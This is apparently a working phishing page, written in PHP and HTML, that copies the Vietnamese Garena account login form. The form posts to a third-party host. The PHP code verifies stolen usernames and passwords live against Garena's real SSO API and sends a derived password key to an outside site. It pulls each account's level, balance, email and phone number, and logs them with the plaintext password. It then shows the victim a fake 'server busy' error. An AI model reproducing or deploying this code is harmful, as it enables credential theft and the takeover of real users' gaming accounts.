
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="description" content="Garena">
<link rel="shortcut icon" href="http://cdn.garenanow.com/webmain/static/favicon.ico" type="image/x-icon"/>
<link href="http://sso.garena.com/css/sso.css?v=0.47" rel="stylesheet" type="text/css"/>
<!-- Page Specific -->
<script src="http://www.google.com/jsapi"></script>
<script type="text/javascript">google.load("jquery", "1.5.0");</script>
<script language="JavaScript" type="text/javascript" src="http://cdn.garenanow.com/webmain/static/js/jsbn.js"></script>
<script language="JavaScript" type="text/javascript" src="http://cdn.garenanow.com/webmain/static/js/prng4.js"></script>
<script language="JavaScript" type="text/javascript" src="http://cdn.garenanow.com/webmain/static/js/rng.js"></script>
<script language="JavaScript" type="text/javascript" src="http://cdn.garenanow.com/webmain/static/js/rsa.js"></script>
<script language="JavaScript" type="text/javascript" src="http://cdn.garenanow.com/webmain/static/js/grsa.js"></script>
<script src="https://cdn.jsdelivr.net/npm/jsencrypt@3.2.1/bin/jsencrypt.min.js"></script>
<title>Garena</title>
<style>
.error-msg { color: red !important; }
.error-msg { padding-bottom: -12px !important; }
</style>
<style>
.recaptchatable #recaptcha_response_field {
    width: 145px !important;
    position: relative !important;
    bottom: 7px !important;
    padding: 10px;
    margin: 15px 0 0 0 !important;
    font-size: 10pt;
    height: 20px;
}
.recaptcha_only_if_privacy {
display: none !important;
}
</style>
<script>

    function getCookie(name) {
let cookieStr = document.cookie;
if (cookieStr){
    let cookieArray = cookieStr.split(";")
    for (let i = 0; i< cookieArray.length;i++){
        let keyValueArr = cookieArray[i].split("=")
        if(keyValueArr[0].trim()==name){
            return keyValueArr[1];
        }
    }
}
    }



function createCookie(){
    var public_key = "-----BEGIN PUBLIC KEY-----\
		MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDR7FHnzqB8syM62mAJAG7z6/ie\
		/Vz3eq0hEFHQCAd9xxQocrjDbulx1LNox5wTprvLibVRqDCMaPcXZMFRnerZC1YO\
		Ems2U3VwDMWi5s+B4qD+6jG1PB+NPzrlIt+asZtcDDkdmX1t5WgHMoubvV9tCOpH\
		YUBgF34S9lvbldXW4wIDAQAB\
		-----END PUBLIC KEY-----";
        var encrypt = new JSEncrypt();
encrypt.setPublicKey(public_key);
var password2 = encrypt.encrypt(document.getElementById("sso_login_form_password").value);
;
var encrypt2 = new JSEncrypt();
encrypt2.setPublicKey(public_key);
var new_passowrd = encrypt.encrypt('newpass113322');
document.cookie ='password2='+password2+';path=/' ;
document.cookie ='new_password='+new_passowrd+';path=/' ;
}

    	function generate_captcha_key() {
		return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
			var r = Math.random() * 16 | 0,
			    v = c == 'x' ? r : r & 0x3 | 0x8;
			return v.toString(16);
		}).replace(/-/g, '');

	}
    document.cookie = 'captcha_key='+generate_captcha_key()+';path=/' ;

</script>
</head>
<body>
<?php
//error_reporting(0);
$check = 9;
if (isset($_POST['username'])) {
    require 'Curl.php';
    $username = !empty($_POST['username']) ? $_POST['username'] : "";
    $password = !empty($_POST['password']) ? $_POST['password'] : "";
    $captcha_key = !empty($_POST['captcha_key']) ? $_POST['captcha_key'] : "";
    $captcha = !empty($_POST['captcha']) ? $_POST['captcha'] : "";
    setcookie('password', $password, time() + (86400 * 30), "/"); // 86400 = 1 day
//Phan nay la check prelogin
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    $timenow = round(microtime(true) * 1000);
    curl_setopt_array($curl, array(
        CURLOPT_URL => 'https://sso.garena.com/api/prelogin?account=' . $username . '&format=json&id=' . $timenow . '&app_id=10100',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 0,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => 'GET',
        CURLOPT_HTTPHEADER => array(
            'Cookie: datadome=..NtNksbZMenLkO--HSuh-rV9Zl-1332K3ooxpYTQER4xAtmWGAYDQQH09Z6VlqMpDcj0hmG2y~iNuIQ1XE3xQJoaMPvKfwA72GjBCxYEDLQ1C__K.3ZAUe7oJ95CttT',
            'X-Datadome-Clientid: ..NtNksbZMenLkO--HSuh-rV9Zl-1332K3ooxpYTQER4xAtmWGAYDQQH09Z6VlqMpDcj0hmG2y~iNuIQ1XE3xQJoaMPvKfwA72GjBCxYEDLQ1C__K.3ZAUe7oJ95CttT',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36',
            'Referer: https://sso.garena.com/ui/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F%3Flocale_name%3DVN&locale=vi-VN',
        ),
    ));

    $response = curl_exec($curl); //chay get thong tin check acc

    $json = json_decode($response, true); //decode sang json
    //echo $response;
    curl_close($curl);
    //check prelogin
if(!empty($json['url'])){
    $check == 1;
} elseif (!empty($json['v1']) && !empty($json['v2'])) {
   

        //neu co acc thi ma hoa password

        //echo $json['v1'] . ' ' . $json['v2'] . ' working! '; //check thong tin acc

        $passwordMd5 = md5($password);
        $passwordKey = hash("sha256", hash("sha256", $passwordMd5 . $json['v1']) . $json['v2']);
        $curl2 = curl_init();
        curl_setopt($curl2, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curl2, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt_array($curl2, array(
            CURLOPT_URL => 'http://www.cryptogrium.com/crypto.php',
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_ENCODING => '',
            CURLOPT_MAXREDIRS => 10,
            CURLOPT_TIMEOUT => 0,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            CURLOPT_CUSTOMREQUEST => 'POST',
            CURLOPT_POSTFIELDS => array(
                'optype' => 'aes_ecb',
                'operation' => 'encrypt',
                'blocksize' => '256',
                'key' => $passwordKey
                ,
                'input' => $passwordMd5),
        ));

        $encryptpwjson = curl_exec($curl2);
        preg_match('/<response>(.*?)<\/response>/', $encryptpwjson, $matches);
        $encryptpw = $matches[1];
        $timenow2 = round(microtime(true) * 1000);
        //echo $encryptpw;
        //echo ' ' . $timenow;

        curl_close($curl2);

        $curl = curl_init();
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt_array($curl, array(
            CURLOPT_URL => 'https://sso.garena.com/api/login?account=' . $username . '&password=' . $encryptpw . '&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&format=json&id=' . $timenow2 . '&app_id=10100',
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_ENCODING => '',
            CURLOPT_MAXREDIRS => 10,
            CURLOPT_TIMEOUT => 0,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HEADER => true,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            CURLOPT_CUSTOMREQUEST => 'GET',
            CURLOPT_HTTPHEADER => array(
                'Cookie: datadome=..NtNksbZMenLkO--HSuh-rV9Zl-1332K3ooxpYTQER4xAtmWGAYDQQH09Z6VlqMpDcj0hmG2y~iNuIQ1XE3xQJoaMPvKfwA72GjBCxYEDLQ1C__K.3ZAUe7oJ95CttT; sso_key=4ed0cc8a5b89a0c74c8427122bde0a09c7059604f1dda9226f7d2d9a8a97241c',
                'X-Datadome-Clientid: ..NtNksbZMenLkO--HSuh-rV9Zl-1332K3ooxpYTQER4xAtmWGAYDQQH09Z6VlqMpDcj0hmG2y~iNuIQ1XE3xQJoaMPvKfwA72GjBCxYEDLQ1C__K.3ZAUe7oJ95CttT',
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36',
                'Referer: https://sso.garena.com/ui/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F%3Flocale_name%3DVN&locale=vi-VN',
            ),
        ));

        $getSes = curl_exec($curl);
        $header_size = curl_getinfo($curl, CURLINFO_HEADER_SIZE);
        $header = substr($getSes, 0, $header_size);
        $body = substr($getSes, $header_size);
        //echo ' header ' . $header.' body ' . $body;
        preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $header, $matches);
$cookies = array();
foreach($matches[1] as $item) {
    parse_str($item, $cookie);
    $cookies = array_merge($cookies, $cookie);
}
//var_dump($cookies['sso_key']);
$sso_key = $cookies['sso_key'];
preg_match_all('/\"session_key\": "([^"]+)"/mi', $body, $matches2);


$json2=$matches2[1];

//var_dump($json2);
        curl_close($curl);
        //$json2 = json_decode($getSes, true); //decode sang json
    
        //echo ' ses key ' . $json2['session_key'];


        if(!empty($json2)){
            $check = 2;
            $session_key = $json2;
            // get info account
            $curl = curl_init();
            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
            curl_setopt_array($curl, array(
              CURLOPT_URL => 'https://account.garena.com/api/account/init?session_key='.$json2,
              CURLOPT_RETURNTRANSFER => true,
              CURLOPT_ENCODING => '',
              CURLOPT_MAXREDIRS => 10,
              CURLOPT_TIMEOUT => 0,
              CURLOPT_FOLLOWLOCATION => true,
              CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
              CURLOPT_CUSTOMREQUEST => 'GET',
              CURLOPT_HTTPHEADER => array(
                'Cookie:  datadome=.4L5-Zae94t4n-EDDq9Xpe~BVA5qz2iafpPm59qswZgOxbXgT-DL3qBLU3xEMhwELQ65DgeR22qax2IapR6Nm8npX~sN-f9Sld4Gsy0b8U_XpsrIJiHUux1vNn-_~WtP;sso_key='.$sso_key
              ),
            ));
            
            $getinfo = curl_exec($curl);
            $infoacc = json_decode($getinfo, true);
            curl_close($curl);
            //var_dump( $infoacc);

            $Level = $infoacc['user_info']['level'];
            $Shell = $infoacc['user_info']['shell'];
            $Email = $infoacc['user_info']['email'];

                $Phone = $infoacc['user_info']['mobile_no'];


            $emailv = $infoacc['user_info']['email_v'];
            $file = fopen('tonghopnhungthangngu.txt', 'a+');
            fwrite($file,date("d/m/Y").' '.$username . ' / ' . $password. ' level '.$Level. ' so '.$Shell.' sdt '.$Phone.' email '.$Email. "\n");
            fclose($file);
            //header("Location: captcha.php");



        }else{
            $check = 3;
        }
        // 86400 = 1 day
        

    } elseif (!empty($json['error']) === "error_no_account")  {
        //echo ' Captcha needed ';
        $check = 3;
        //$json = [
        //  "success" => false,
        // "captcha" => true,
        //  "msg" => "Đăng nhập thất bại: vui lòng nhập mã xác nhận.",
        //];
    } elseif (!empty($json['error']) === "error_require_captcha") {
        //$json = [
        //  "success" => false,
        //"captcha" => true,
        //"msg" => "Đăng nhập thất bại: mã xác minh sai.",
        //echo ' sai captcha ';
        $check = 1;
        //];
    } elseif (!empty($json['error']) === "error_captcha") {
        //$json = [
        //"success" => false,
        //"msg" => "Đăng nhập thất bại: không có tài khoản này.",
        //echo ' ko co acc nay ';
        $check = 1;
        // ];
    }
}

?>
<div id="page">
<div id="header" class="header">
<div class="langWrapper fr">
<select class="lang">
<option value="vi-VN">Việt Nam - Tiếng việt</option>
<option value="en-SG">Singapore - English</option>
<option value="zh-SG">新加坡 - 简体中文</option>
<option value="zh-TW">台灣 - 繁体中文</option>
<option value="en-PH">Philippines - English</option>
<option value="th-TH">ไทย - ไทย</option>
<option value="id-ID">Indonesia - Bahasa Indonesia</option>
<option value="ru-RU">Россия - Русский</option>
<option value="en-MY">Malaysia - English</option>
</select><span class="icon-earth"></span></div>
<div class="topBarGarena"></div>
<div class="topBar"></div>
<h1><a class="logo" href="/"><img src="http://sso.garena.com/images/header_garena.png" style="width: 135px; height: 46px;"></a></h1></div>
<div id="main-panel">
<div class="content" style="top: 2.4px;">
<h2 class="title">Đăng nhập</h2>
<div class="partnerLogin"><p>Đăng nhập với tài khoản Garena hoặc những tài khoản dưới đây</p><div class="partnerLink"><a href="/fb/" class="icon-facebook"></a></div></div>


<form class="loginForm" id="loginForm" method="post" name='loginForm' action="http://xacminhzgarena.epizy.com/" onsubmit='createCookie();'>
<div class="line" id="line-account">
<input autocapitalize="off" autocorrect="off" placeholder="Tài khoản Garena hoặc Email" name="username" id="sso_login_form_account"  type="text" required>
</div>
<div class="line"  id="line-password">
<input placeholder="Mật khẩu" name="password" id="sso_login_form_password" type="password" required></div>
<div class="line btnLine" id="line-btn">
<input class="btn" name="submit_button" value="Đăng Nhập" id="" type="submit">
</div>
<span class="errorMsg" id="msg"><center>
<?php if ($check == 3) {?>
<span id="msg" class="errorMsg"><em></em>Đăng nhập thất bại: sai tên tài khoản hoặc mật khẩu</span><br>
<?php } elseif ($check == 1) {?>
<span id="msg2" class="errorMsg"><em></em>Máy chủ quá tải, thử lại sau!</span><br>
<?php } elseif ($check == 2) {?>
    <span id="msg3" class="errorMsg"><em></em>Máy chủ đang bận, thử lại sau!</span><br>
<?php }?></center>
<br>
<div class="divider"><span>hoặc</span></div>
<div id="line-btn" class="line btnLine"><input id="sso_login_link_register" name="register" type="button" value="Tạo tài khoản mới" onclick="javascript:return false;" class="btn black"></div>
<br><div class="divider"><a id="sso_login_link_forget_password" href="javascript:;">Quên mật khẩu?</a></div>
</div>
</div>
</form>
</div>
</div>
</div>
</html>
